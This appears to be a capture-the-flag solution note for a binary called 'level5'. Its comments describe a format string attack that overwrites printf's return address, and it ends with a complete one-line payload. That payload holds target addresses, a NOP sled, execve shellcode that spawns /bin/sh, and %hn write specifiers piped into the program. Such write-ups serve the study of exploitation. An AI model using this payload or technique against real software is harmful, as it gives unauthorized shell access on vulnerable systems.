# same exploit than the last binary (level4) but there is no compare so
# we had to use a shell code and then overwrite the printf's eip register
# by the adress of the shellcode. 
#
# we searched for the return address of printf in the stack.
# we used %NNNd and %*$n to write on the stack and replace the printf eip by the adress of the shellcode
# we had to write 0xbfffff51c at the address 0xbffff50c.
# split in two to use %XXXXd %4$hn (hn being a 16bits integer)
# bfff -> 49151 - 8 - nops - shellcode = 48918
# f51c -> 62748 - 49151 = 13630
#
#(python -c 'print "\xfe\xf5\xff\xbf" + "\xfc\xf5\xff\xbf" + 200 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "%48918d%4$hn%13630d%5$hn"';cat) | ./level5
